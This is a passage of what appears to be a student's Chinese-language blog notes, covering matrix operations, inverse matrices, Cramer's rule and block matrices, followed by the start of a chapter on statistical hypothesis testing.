src="/2024/06/21/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E7%9F%A9%E9%98%B5%E5%8F%8A%E5%85%B6%E8%BF%90%E7%AE%97/image_idTQxxfXD-.png"></p><p>注意：两个同型矩阵，才可以相加。</p><h2 id="2-2-数与矩阵相乘"><a href="#2-2-数与矩阵相乘" class="headerlink" title="2.2 数与矩阵相乘"></a>2.2 数与矩阵相乘</h2><p>数$\lambda$与矩阵$A&#x3D;\left(a_{i j}\right)$的乘积，简称<strong>数乘</strong>，记作$\lambda A$或$A\lambda$，规定为</p><p><img src="/2024/06/21/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E7%9F%A9%E9%98%B5%E5%8F%8A%E5%85%B6%E8%BF%90%E7%AE%97/image_NYc3lJTgXP.png"></p><p>注意：数乘矩阵，需要将这个数乘以该矩阵的每个元素，得到的新矩阵与原矩阵同型。</p><p>特别地，当$\lambda&#x3D;-1$时，将$(-1)A$称为A的负矩阵，记作－A，即：</p><p><img src="/2024/06/21/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E7%9F%A9%E9%98%B5%E5%8F%8A%E5%85%B6%E8%BF%90%E7%AE%97/image_rjRtX3ifgE.png"></p><p>矩阵的加法和数乘运算统称为<strong>矩阵的线性运算</strong>。</p><h2 id="2-3-线性运算的运算律"><a href="#2-3-线性运算的运算律" class="headerlink" title="2.3 线性运算的运算律"></a>2.3 线性运算的运算律</h2><p>设A、B和C均为$m \times n$矩阵，$\lambda$和$\mu$是数，有如下运算规律：</p><ol><li>加法交换律：${A}+{B}&#x3D;{B}+{A}$</li><li>加法结合律：$(A+B)+C&#x3D;A+(B+C)$</li><li>$A+(-A)&#x3D;O$</li><li>$(\lambda \mu)A&#x3D;\lambda (\mu A)$</li><li>$(\lambda+\mu) A&#x3D;\lambda A+\mu A$</li><li>$\lambda(A+B)&#x3D;\lambda A+\lambda B$</li></ol><h2 id="2-4-矩阵的乘法运算"><a href="#2-4-矩阵的乘法运算" class="headerlink" title="2.4 矩阵的乘法运算"></a>2.4 矩阵的乘法运算</h2><p>设$A&#x3D;\left(a_{i j}\right)$是一个$m \times s$矩阵，$B&#x3D;\left(b_{i j}\right)$是一个$s \times n$矩阵，规定矩阵A与矩阵B的乘法是一个$m \times n$矩阵$C&#x3D;\left(c_{i j}\right)$，其中</p><p>$$<br>c_{i j}&#x3D;a_{i 1} b_{1 j}+a_{i 2} b_{2 j}+\cdots+a_{i s} b_{s j}&#x3D;\sum_{k&#x3D;1}^{s} a_{i k} b_{k j}<br>$$</p><p>并将此乘积记为$C&#x3D;AB$。</p><p>注意：只有当第一个矩阵A（左矩阵）的列数等于第二个矩阵B（右矩阵）的行数时，两个矩阵才能相乘，并且乘积矩阵AB的行数等于A的行数，而列数等于B的列数。</p><h3 id="2-4-1-乘法运算的运算律"><a href="#2-4-1-乘法运算的运算律" class="headerlink" title="2.4.1 乘法运算的运算律"></a>2.4.1 乘法运算的运算律</h3><p>设A、B和C均为矩阵，$\lambda$是数，有如下运算规律：</p><ol><li>乘法的结合律：$(A B) C&#x3D;A(B C)$</li><li>$\lambda(A B)&#x3D;A(\lambda B)$</li><li>$A(B+C)&#x3D;A B+A C$</li><li>$(B+C) A&#x3D;B A+C A$</li></ol><p>单位矩阵E在矩阵的乘法中的作用，类似于数1在数的乘法中的作用。</p><p>由于矩阵的乘法满足结合律，可定义矩阵的幂：设矩阵A是n阶方阵，定义：</p><p>$$<br>A^{1}&#x3D;A, \quad A^{2}&#x3D;A^{1} A^{1}, \cdots, \quad A^{k}&#x3D;A^{k-1} A^{1}<br>$$</p><p>其中k是正整数，即$A^k$是k个A连乘。</p><p>特别地，规定$A^{0}&#x3D;E$，又设$f(x)&#x3D;a_{0} x^{m}+a_{1} x^{m-1}+\cdots+a_{m-1} x+a_{m}$是关于x的一元m次多项式，则</p><p>$$<br>f(A)&#x3D;a_{0} A^{m}+a_{1} A^{m-1}+\cdots+a_{m-1} A+a_{m} E<br>$$</p><p>是一个n阶方阵，称为<strong>方阵A的m次矩阵多项式</strong>。</p><p>由于矩阵的乘法不满足交换律，所以以前学过的公式，如平方差公式、和或差的平方公式、和或差的立方公式、立方和或差公式等，均不一定成立。</p><p><img src="/2024/06/21/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E7%9F%A9%E9%98%B5%E5%8F%8A%E5%85%B6%E8%BF%90%E7%AE%97/image_luac6HnRDA.png"></p><h2 id="2-5-矩阵的其他运算"><a href="#2-5-矩阵的其他运算" class="headerlink" title="2.5 矩阵的其他运算"></a>2.5 矩阵的其他运算</h2><h3 id="2-5-1-转置运算"><a href="#2-5-1-转置运算" class="headerlink" title="2.5.1 转置运算"></a>2.5.1 转置运算</h3><p>将矩阵A的行换成同序数的列得到的矩阵，称为A的转置矩阵，记作$A^T$，即：</p><p><img src="/2024/06/21/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E7%9F%A9%E9%98%B5%E5%8F%8A%E5%85%B6%E8%BF%90%E7%AE%97/image_M5XL6pwDTc.png"></p><p>矩阵$A^T$的$(i,j)$元就是矩阵A的$(j,i)$元。</p><p>转置矩阵也是一种运算，有如下运算律：</p><ol><li>$\left(A^{T}\right)^{T}&#x3D;A$</li><li>$(A+B)^{T}&#x3D;A^{T}+B^{T}$</li><li>$(\lambda A)^{T}&#x3D;\lambda A^{T}$</li><li>$(A B)^{T}&#x3D;B^{T} A^{T}$</li></ol><p>同时称满足$A^T&#x3D;A$的矩阵为<strong>对称矩阵</strong>。</p><h3 id="2-5-2-矩阵的行列式"><a href="#2-5-2-矩阵的行列式" class="headerlink" title="2.5.2 矩阵的行列式"></a>2.5.2 矩阵的行列式</h3><p>由n阶方阵A的元素所构成的行列式（各元素的位置不变），称为方阵A的行列式，记作$|A|$或$detA$。</p><p>由A确定|A|是一种运算，有如下运算律：</p><ol><li>$\left|\boldsymbol{A}^{T}\right|&#x3D;|\boldsymbol{A}|$，这个相当于使用了行列式的性质，行列式的行和列都是等价的</li><li>$|\lambda A|&#x3D;\lambda^{n}|A|$，相当于对行列式的每一行都乘以一个数，由行列式的性质得，可以把每一行中的这个数给提出来，然后一共有n行，就变成了$\lambda^n$</li><li>$|{A} {B}|&#x3D;|{A}||{B}|$，两个矩阵乘积的行列式等于两个矩阵的行列式的乘积，这个不知道为啥…</li></ol><h3 id="2-5-3-伴随矩阵"><a href="#2-5-3-伴随矩阵" class="headerlink" title="2.5.3 伴随矩阵"></a>2.5.3 伴随矩阵</h3><p>行列式|A|的各个元素的<strong>代数余子式</strong>$A_{ij}$所构成的如下矩阵</p><p><img src="/2024/06/21/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E7%9F%A9%E9%98%B5%E5%8F%8A%E5%85%B6%E8%BF%90%E7%AE%97/image_zRsIHZ0Llh.png"></p><p>称为矩阵A的<strong>伴随矩阵</strong>，简称<strong>伴随阵</strong>。</p><blockquote><p>余子式和代数余子式的区别是代数余子式带正负号，即$A_{ij}&#x3D;(-1)^{i+j}M_{ij}$。</p></blockquote><p>设$A^*$是A的伴随矩阵，故$A^{<em>}&#x3D;A^{</em>} \boldsymbol{A}&#x3D;|\boldsymbol{A}| E$。</p><p>证明：由伴随矩阵的定义可得</p><p><img src="/2024/06/21/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E7%9F%A9%E9%98%B5%E5%8F%8A%E5%85%B6%E8%BF%90%E7%AE%97/image_2mZ01lGY32.png"></p><p><img src="/2024/06/21/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E7%9F%A9%E9%98%B5%E5%8F%8A%E5%85%B6%E8%BF%90%E7%AE%97/image_Wsh7V4gv5X.png"></p><p><img src="/2024/06/21/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E7%9F%A9%E9%98%B5%E5%8F%8A%E5%85%B6%E8%BF%90%E7%AE%97/image_oe-I4TTYc5.png"></p><h2 id="2-6-总结"><a href="#2-6-总结" class="headerlink" title="2.6 总结"></a>2.6 总结</h2><p><img src="/2024/06/21/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E7%9F%A9%E9%98%B5%E5%8F%8A%E5%85%B6%E8%BF%90%E7%AE%97/image_uo-OaI8OSM.png"></p><hr><h1 id="3-逆矩阵"><a href="#3-逆矩阵" class="headerlink" title="3 逆矩阵"></a>3 逆矩阵</h1><h2 id="3-1-逆矩阵的概念"><a href="#3-1-逆矩阵的概念" class="headerlink" title="3.1 逆矩阵的概念"></a>3.1 逆矩阵的概念</h2><p>对于n阶矩阵A，如果存在一个n阶矩阵B，使得</p><p>$$<br>AB&#x3D;BA&#x3D;E<br>$$</p><p>则称矩阵A<strong>可逆</strong>，并将矩阵B称为A的<strong>逆矩阵</strong>，简称逆阵。</p><p>若A是可逆的，则A的逆矩阵是唯一的。A的逆阵记作$A^{-1}$。</p><p>【定理1】若矩阵A可逆，则$|A|\neq0$。</p><h2 id="3-2-逆矩阵的求法"><a href="#3-2-逆矩阵的求法" class="headerlink" title="3.2 逆矩阵的求法"></a>3.2 逆矩阵的求法</h2><p>若$|A|\neq0$，则矩阵A可逆，且</p><p>$$<br>A^{-1}&#x3D;\frac{1}{|A|} A^{*}<br>$$</p><p>其中$A^*$为矩阵A的伴随矩阵。</p><ul><li>当$|A| &#x3D; 0$时，矩阵A称为奇异矩阵</li><li>当$|A|\neq0$时，矩阵A称为非奇异矩阵</li></ul><p><img src="/2024/06/21/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E7%9F%A9%E9%98%B5%E5%8F%8A%E5%85%B6%E8%BF%90%E7%AE%97/image_OM15FJqlE-.png"></p><p>逆阵满足下述运算律：</p><p>（1）若A可逆，则$A^{-1}$亦可逆，且</p><p>$$<br>\left(A^{-1}\right)^{-1}&#x3D;A, \quad\left|A^{-1}\right|&#x3D;\frac{1}{|A|}<br>$$</p><p>（2）若A可逆，数$\lambda \neq 0$，则$\lambda A$可逆，且</p><p>$$<br>(\lambda A)^{-1}&#x3D;\frac{1}{\lambda} A^{-1}<br>$$</p><p>（3）若A，B为同阶可逆矩阵，则AB可逆，且$(A B)^{-1}&#x3D;B^{-1} A^{-1}$</p><p>（4）若A可逆，则$A^T$亦可逆，且$\left(A^{T}\right)^{-1}&#x3D;\left(A^{-1}\right)^{T}$</p><h2 id="3-3-逆矩阵的初步应用"><a href="#3-3-逆矩阵的初步应用" class="headerlink" title="3.3 逆矩阵的初步应用"></a>3.3 逆矩阵的初步应用</h2><p>设$f(A)&#x3D;a_{0} A^{m}+a_{1} A^{m-1}+\cdots+a_{m-1} A+a_{m} E$是矩阵A的m次多项式：</p><p>（1）若$A&#x3D;P \Lambda P^{-1}$，则$\boldsymbol{A}^{k}&#x3D;\boldsymbol{P} \Lambda^{k} P^{-1}$，从而</p><p><img src="/2024/06/21/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E7%9F%A9%E9%98%B5%E5%8F%8A%E5%85%B6%E8%BF%90%E7%AE%97/image_ICmz0FDHi9.png"></p><p>（2）若$\Lambda&#x3D;\operatorname{diag}\left(\lambda_{1}, \lambda_{2}, \cdots, \lambda_{n}\right)$为对角阵，则$\Lambda^{k}&#x3D;\operatorname{diag}\left(\lambda_{1}^{k}, \lambda_{2}^{k}, \cdots, \lambda_{n}^{k}\right)$，从而</p><p><img src="/2024/06/21/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E7%9F%A9%E9%98%B5%E5%8F%8A%E5%85%B6%E8%BF%90%E7%AE%97/image_XNhyhvSrhS.png"></p><p><img src="/2024/06/21/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E7%9F%A9%E9%98%B5%E5%8F%8A%E5%85%B6%E8%BF%90%E7%AE%97/image_zcux8kL57Y.png"></p><p><img src="/2024/06/21/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E7%9F%A9%E9%98%B5%E5%8F%8A%E5%85%B6%E8%BF%90%E7%AE%97/image_DC7P7cuqfp.png"></p><p><img src="/2024/06/21/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E7%9F%A9%E9%98%B5%E5%8F%8A%E5%85%B6%E8%BF%90%E7%AE%97/image_Zy1sEM7wsc.png"></p><p><img src="/2024/06/21/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E7%9F%A9%E9%98%B5%E5%8F%8A%E5%85%B6%E8%BF%90%E7%AE%97/image_t7YnD8tjrI.png"></p><h2 id="3-4-总结"><a href="#3-4-总结" class="headerlink" title="3.4 总结"></a>3.4 总结</h2><ol><li>逆矩阵的概念</li><li>逆矩阵存在的条件</li><li>逆矩阵的计算<ul><li>待定系数法</li><li>公式法</li><li>初等变化法（下一节）</li></ul></li></ol><hr><h1 id="4-克拉默法则"><a href="#4-克拉默法则" class="headerlink" title="4 克拉默法则"></a>4 克拉默法则</h1><h2 id="4-1-克拉默法则"><a href="#4-1-克拉默法则" class="headerlink" title="4.1 克拉默法则"></a>4.1 克拉默法则</h2><p>之前介绍了使用二阶行列式求解两个二元线性方程组成的方程组，现在进行推广，介绍求解由n个n元线性方程组成的方程组的克拉默法则。</p><p>含有n个未知数$x_{1}, x_{2}, \cdots, x_{n}$，n个线性方程的方程组：</p><p><img src="/2024/06/21/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E7%9F%A9%E9%98%B5%E5%8F%8A%E5%85%B6%E8%BF%90%E7%AE%97/image_o6L5SQabHi.png"></p><p>与二、三元线性方程组类似，它的解可以用n阶行列式表示，即有若线性方程（1）的系数行列式不等于零，即</p><p><img src="/2024/06/21/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E7%9F%A9%E9%98%B5%E5%8F%8A%E5%85%B6%E8%BF%90%E7%AE%97/image_DEItjODxIK.png"></p><p>那么方程组（1）有唯一解：</p><p>$$<br>x_{1}&#x3D;\frac{D_{1}}{D}, x_{2}&#x3D;\frac{D_{2}}{D}, x_{3}&#x3D;\frac{D_{2}}{D}, \cdots, x_{n}&#x3D;\frac{D_{n}}{D}<br>$$</p><p>其中$D_{j}(j&#x3D;1,2, \cdots, n)$是将系数行列式的第j列的元素用方程组右端的常数项代替后，得到的n阶行列式，即：</p><p><img src="/2024/06/21/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E7%9F%A9%E9%98%B5%E5%8F%8A%E5%85%B6%E8%BF%90%E7%AE%97/image_NaNx0T5A0_.png"></p><h2 id="4-2-重要定理"><a href="#4-2-重要定理" class="headerlink" title="4.2 重要定理"></a>4.2 重要定理</h2><h3 id="4-2-1-定理1"><a href="#4-2-1-定理1" class="headerlink" title="4.2.1 定理1"></a>4.2.1 定理1</h3><p>若线性方程组（1）的系数行列式$D \neq 0$，则（1）一定有解，且解是唯一的。</p><h3 id="4-2-2-定理2"><a href="#4-2-2-定理2" class="headerlink" title="4.2.2 定理2"></a>4.2.2 定理2</h3><p>若线性方程组（1）无解或有两个不同的解，则（1）的系数行列式$D&#x3D;0$。</p><p>方程组（1）右端的常数项$b_{1}, b_{2}, \cdots, b_{n}$不全为零时，线性方程组（1）称为非齐次线性方程组；当$b_{1}, b_{2}, \cdots, b_{n}$全为零时，线性方程组（1）称为齐次线性方程组。</p><p>对于齐次线性方程组</p><p><img src="/2024/06/21/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E7%9F%A9%E9%98%B5%E5%8F%8A%E5%85%B6%E8%BF%90%E7%AE%97/image_5ZFCJbQuKh.png"></p><p>$x_{1}&#x3D;x_{2}&#x3D;\cdots&#x3D;x_{n}&#x3D;0$一定是它的解，这个解称为齐次线性方程组（2）的零解；若存在一组不全为零的数是（2）的解，称其为（2）的非零解。</p><p><img src="/2024/06/21/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E7%9F%A9%E9%98%B5%E5%8F%8A%E5%85%B6%E8%BF%90%E7%AE%97/image_vvk613rUso.png"></p><h3 id="4-2-3-定理3"><a href="#4-2-3-定理3" class="headerlink" title="4.2.3 定理3"></a>4.2.3 定理3</h3><p>若线性方程组（2）的系数行列式$D \neq 0$，则（2）只有零解，没有非零解。</p><h3 id="4-2-4-定理4"><a href="#4-2-4-定理4" class="headerlink" title="4.2.4 定理4"></a>4.2.4 定理4</h3><p>若线性方程组（2）有非零解，则（2）的系数行列式$D&#x3D;0$。</p><h2 id="4-3-总结"><a href="#4-3-总结" class="headerlink" title="4.3 总结"></a>4.3 总结</h2><p>（1）利用克拉默法则解线性方程组的条件：</p><ul><li>方程的个数&#x3D;未知数的个数</li><li>系数行列式$D \neq 0$</li></ul><p>（2）对非齐次线性方程组</p><p><img src="/2024/06/21/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E7%9F%A9%E9%98%B5%E5%8F%8A%E5%85%B6%E8%BF%90%E7%AE%97/image_P0EwQj1WkK.png"></p><p>（3）对齐次线性方程组</p><p><img src="/2024/06/21/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E7%9F%A9%E9%98%B5%E5%8F%8A%E5%85%B6%E8%BF%90%E7%AE%97/image_rPXtCsM9Ih.png"></p><hr><h1 id="5-矩阵分块法"><a href="#5-矩阵分块法" class="headerlink" title="5 矩阵分块法"></a>5 矩阵分块法</h1><h2 id="5-1-矩阵的分块"><a href="#5-1-矩阵的分块" class="headerlink" title="5.1 矩阵的分块"></a>5.1 矩阵的分块</h2><p>对于行数和列数较高的矩阵A，运算有时会采用分块法，使大矩阵的运算转化成小矩阵的运算。</p><p>将矩阵A用若干条纵线和横线分成许多小矩阵，每个小矩阵称为A的子块，以子块为元素的形式上的矩阵称为<strong>分块矩阵</strong>。</p><p><img src="/2024/06/21/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E7%9F%A9%E9%98%B5%E5%8F%8A%E5%85%B6%E8%BF%90%E7%AE%97/image_66TLBlKzRO.png"></p><h2 id="5-2-分块矩阵的运算规则"><a href="#5-2-分块矩阵的运算规则" class="headerlink" title="5.2 分块矩阵的运算规则"></a>5.2 分块矩阵的运算规则</h2><p>分块矩阵的运算规则与普通矩阵的运算规则类似。</p><p>（1）设矩阵A与B的行数相同、列数也相同，采用相同的分块法，有</p><p><img src="/2024/06/21/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E7%9F%A9%E9%98%B5%E5%8F%8A%E5%85%B6%E8%BF%90%E7%AE%97/image_1UIfgV_co1.png"></p><p>其中$A_{ij}$与$B_{ij}$的行数相同、列数也相同，则</p><p><img src="/2024/06/21/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E7%9F%A9%E9%98%B5%E5%8F%8A%E5%85%B6%E8%BF%90%E7%AE%97/image_RUQbbPfUXz.png"></p><p>（2）设$A&#x3D;\left(\begin{array}{ccc}A_{11} &amp; \cdots &amp; A_{1 r} \ \vdots &amp; &amp; \vdots \ A_{s 1} &amp; \cdots &amp; A_{s r}\end{array}\right)$，$\lambda$为数，则</p><p><img src="/2024/06/21/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E7%9F%A9%E9%98%B5%E5%8F%8A%E5%85%B6%E8%BF%90%E7%AE%97/image_86XL339sdU.png"></p><p><img src="/2024/06/21/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E7%9F%A9%E9%98%B5%E5%8F%8A%E5%85%B6%E8%BF%90%E7%AE%97/image_FfhhIeRzh_.png"></p><p><img src="/2024/06/21/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E7%9F%A9%E9%98%B5%E5%8F%8A%E5%85%B6%E8%BF%90%E7%AE%97/image_-frBJ_uX6R.png"></p><p>（4）设$A&#x3D;\left(\begin{array}{ccc}A_{11} &amp; \cdots &amp; A_{1 r} \ \vdots &amp; &amp; \vdots \ A_{s 1} &amp; \cdots &amp; A_{s r}\end{array}\right)$，则</p><p><img src="/2024/06/21/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E7%9F%A9%E9%98%B5%E5%8F%8A%E5%85%B6%E8%BF%90%E7%AE%97/image_MCx8itdXqg.png"></p><p>（5）设A是n阶矩阵，若A的分块矩阵只有在对角线上有非零子块，其余子块均为零矩阵，且在对角线上的子块都是方阵，即</p><p><img src="/2024/06/21/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E7%9F%A9%E9%98%B5%E5%8F%8A%E5%85%B6%E8%BF%90%E7%AE%97/image_ukiF8XyrG6.png"></p><p>其中$A_{i}(i&#x3D;1,2, \cdots, s)$都是方阵，称A为分块对角阵。分块对角阵的行列式有下述性质：</p><p>$$<br>|A|&#x3D;\left|A_{1}\right|\left|A_{2}\right| \cdots\left|A_{s}\right|<br>$$</p><p>由此可知，若$\left|A_{i}\right| \neq 0(i&#x3D;1,2, \cdots, s)$，有</p><p><img src="/2024/06/21/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E7%9F%A9%E9%98%B5%E5%8F%8A%E5%85%B6%E8%BF%90%E7%AE%97/image_O66g3LT13c.png"></p>]]></content>
      
      
      <categories>
          
          <category> 专业课 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 线性代数 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>概率论第8章：假设检验</title>
      <link href="/2024/06/20/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC8%E7%AB%A0%EF%BC%9A%E5%81%87%E8%AE%BE%E6%A3%80%E9%AA%8C/"/>
      <url>/2024/06/20/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC8%E7%AB%A0%EF%BC%9A%E5%81%87%E8%AE%BE%E6%A3%80%E9%AA%8C/</url>
      
        <content type="html"><![CDATA[<h1 id="1-假设检验"><a href="#1-假设检验" class="headerlink" title="1 假设检验"></a>1 假设检验</h1><h2 id="1-1-基本原理"><a href="#1-1-基本原理" class="headerlink" title="1.1 基本原理"></a>1.1 基本原理</h2><p>背景：在总体的分布函数完全未知或只知其形式、但不知其参数的情况下, 为了推断总体的某些性质，提出某些关于总体的假设。</p><p>例如,   提出总体服从泊松分布的假设；又如，对正态总体提出数学期望等于$\mu$的假设等.</p><p>假设检验就是根据得到的样本对所提出的假设作出判断: 是接受, 还是拒绝.</p><blockquote><p>例1：某车间用一台包装机包装葡萄糖, 包得的袋装糖重是一个随机变量,  它服从正态分布.当机器正常时, 其均值为0.5千克, 标准差为0.015千克.某日开工后为检验包装机是否正常, 随机地抽取它所包装的糖9袋,  称得净重为(千克)：0.497  0.506  0.518  0.524  0.498  0.511  0.520  0.515 0.512,  问机器这一天是否正常?&#x20;</p></blockquote><p>分析：用$\mu$和$\sigma$分别表示这一天袋装糖总体X的均值和标准差，由长期实践可知，标准差较稳定，设$\sigma&#x3D;0.015$，则$X \sim N\left(\mu, 0.015^{2}\right)$，其中$\mu$未知。</p><p>目标：根据样本值判断$\mu&#x3D;0.5$还是$\mu \neq 0.5$。</p><p>（1）提出两个对立假设</p><ul><li>$H_{0}: \mu&#x3D;\mu_{0}&#x3D;0.5$</li><li>$H_{1}: \mu \neq \mu_{0}$</li></ul><p>说明：利用已知样本做出判断是接受假设$H_0$，还是拒绝假设$H_1$。</p><p>如果做出的判断是接受$H_0$，则$\mu&#x3D;\mu_0$，即认为机器工作是正常的，否则认真是不正常的。</p><p>（2）找到$\mu$的估计量$\bar{X}$</p><p>$\bar X$是$\mu$的无偏估计量，若$H_0$为真，则$|\bar x-\mu_0|$不应太大。</p><p>（3）构造检验统计量（分布已知）</p><p>$$<br>Z&#x3D;\frac{\bar{X}-\mu_{0}}{\sigma &#x2F; \sqrt{n}} \quad 当 H_{0} 为真时, U \sim N(0,1).<br>$$</p><p>（4）选定常数k判断假设是否正确</p><p>当观察值$\bar x$满足$\frac{\left|\bar{x}-\mu_{0}\right|}{\sigma &#x2F; \sqrt{n}} \geq {k}$时（感觉这个地方有点像置信区间），拒绝假设$H_0$，分支接受假设$H_0$。</p><h3 id="1-1-1-如何确定常数k"><a href="#1-1-1-如何确定常数k" class="headerlink" title="1.1.1 如何确定常数k"></a>1.1.1 如何确定常数k</h3><p>因为当$H_0$为真时，满足$Z&#x3D;\frac{\bar{X}-\mu_{0}}{\sigma &#x2F; \sqrt{n}} \sim N(0,1)$，取标准正态分布分位点$k&#x3D;z_{\alpha&#x2F;2}$，当$\frac{\left|\bar{x}-\mu_{0}\right|}{\sigma &#x2F; \sqrt{n}} \geq z_{\alpha &#x2F; 2}$时，拒绝假设$H_0$，反之接受$H_0$。</p><h2 id="1-2-假设检验的过程"><a href="#1-2-假设检验的过程" class="headerlink" title="1.2 假设检验的过程"></a>1.2 假设检验的过程</h2><p>在例1中选定$\alpha&#x3D;0.05$，则$k&#x3D;z_{\alpha&#x2F;2}&#x3D;z_{0.025}&#x3D;1.96$，又已知n&#x3D;9，$\sigma&#x3D;0.015$，由样本计算得到$\bar x&#x3D;0.511$，既有</p><p>$$<br>\frac{|\bar{x}-\mu_{0}|}{\sigma &#x2F; \sqrt{n}}&#x3D;2.2&gt;1.96<br>$$</p><p>于是拒绝假设$H_0$，认为包装机不正常。</p><p>以上所采取的检验法的合理性分析：</p><p>通常$\sigma$总是取得很小，如$\sigma&#x3D;0.01$，$\sigma&#x3D;0.05$，则：</p><p>$$<br>P{|\frac{\bar{X}-\mu_{0}}{\sigma &#x2F; \sqrt{n}}| \geq z_{\alpha &#x2F; 2}}&#x3D;\alpha<br>$$</p><p>即$\left|\frac{\bar{X}-\mu_{0}}{\sigma &#x2F; \sqrt{n}}\right| \geq z_{\alpha &#x2F; 2}$是一个小概率事件。如果在一次实验中，上述不等式成立，则有理由怀疑原来的假设$H_0$的正确性，因而拒绝假设$H_0$。</p><h2 id="1-3-假设检验的相关概念"><a href="#1-3-假设检验的相关概念" class="headerlink" title="1.3 假设检验的相关概念"></a>1.3 假设检验的相关概念</h2><h3 id="1-3-1-显著性水平"><a href="#1-3-1-显著性水平" class="headerlink" title="1.3.1 显著性水平"></a>1.3.1 显著性水平</h3><p>若$|z|&#x3D;\left|\frac{\bar{x}-\mu_{0}}{\sigma &#x2F; \sqrt{n}}\right| \geq k$，则称$\bar x$与$\mu_0$的差异是显著的，则拒绝假设$H_0$，反之接受$H_0$。</p><p>其中$k$由$α$决定，$α$称为<strong>显著性水平</strong>。</p><h3 id="1-3-2-检验统计量"><a href="#1-3-2-检验统计量" class="headerlink" title="1.3.2 检验统计量"></a>1.3.2 检验统计量</h3><p>统计量$Z&#x3D;\frac{\bar{X}-\mu_{0}}{\sigma &#x2F; \sqrt{n}}$称为<strong>检验统计量</strong>。</p><h3 id="1-3-3-原假设与备择假设"><a href="#1-3-3-原假设与备择假设" class="headerlink" title="1.3.3 原假设与备择假设"></a>1.3.3 原假设与备择假设</h3><p>假设检验问题通常叙述为：在显著性水平α下：</p><ul><li>检验假设$H_{0}: \mu&#x3D;\mu_{0}$</li><li>$H_{1}: \mu \neq \mu_{0}$</li></ul><p>其中$H_0$称为<strong>原假设</strong>或<strong>零假设</strong>，$H_1$称为<strong>备择假设</strong>。</p><h3 id="1-3-4-拒绝域与临界点"><a href="#1-3-4-拒绝域与临界点" class="headerlink" title="1.3.4 拒绝域与临界点"></a>1.3.4 拒绝域与临界点</h3><p>当检验统计量取某个区域$C$中的值时, 我们拒绝原假设$H_0$，则称区域$C$为<strong>拒绝域</strong>，拒绝域的边界点称为<strong>临界点</strong>。</p><p>如在例1中：</p><ul><li>拒绝域为$|z| \geq z_{\alpha &#x2F; 2}$</li><li>临界点为$z&#x3D;-z_{\alpha &#x2F; 2}$和$z&#x3D;z_{\alpha &#x2F; 2}$</li></ul><h3 id="1-3-5-两类错误及记号"><a href="#1-3-5-两类错误及记号" class="headerlink" title="1.3.5 